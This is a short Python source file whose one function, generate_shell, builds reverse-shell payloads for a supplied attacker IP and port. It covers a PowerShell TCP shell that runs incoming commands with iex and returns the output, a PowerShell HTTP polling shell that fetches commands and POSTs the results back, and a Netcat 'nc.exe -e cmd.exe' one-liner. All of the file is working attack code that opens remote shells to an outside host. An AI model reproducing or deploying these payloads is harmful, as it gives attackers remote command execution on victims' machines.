def generate_shell(shell_type, ip, port):
    if shell_type == "PowerShell TCP":
        return [
            f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})',
            '$stream = $client.GetStream()',
            '[byte[]]$bytes = 0..65535|%{0}',
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){',
            '  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)',
            '  $sendback = (iex $data 2>&1 | Out-String )',
            '  $sendback2 = $sendback + "PS " + (pwd).Path + "> "',
            '  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)',
            '  $stream.Write($sendbyte,0,$sendbyte.Length)',
            '  $stream.Flush()',
            '}',
            '$client.Close()'
        ]
    elif shell_type == "PowerShell HTTP":
        return [
            f"# PowerShell HTTP reverse shell to {ip}:{port}",
            f"$server = '{ip}'",
            f"$port = {port}",
            "$uri = \"http://$server:$port/\"",
            "while ($true) {",
            "    try {",
            "        $cmd = Invoke-WebRequest -Uri $uri -UseBasicParsing | Select-Object -ExpandProperty Content",
            "        if ($cmd -eq 'exit') { break }",
            "        if ($cmd) {",
            "            $output = Invoke-Expression $cmd | Out-String",
            "            Invoke-WebRequest -Uri $uri -Method POST -Body @{output=$output} -UseBasicParsing",
            "        }",
            "    } catch {",
            "        Start-Sleep -Seconds 5",
            "    }",
            "    Start-Sleep -Seconds 3",
            "}"
        ]


    elif shell_type == "Netcat":
        return [f"nc.exe {ip} {port} -e cmd.exe"]
    else:
        return ["# Unknown shell type"]
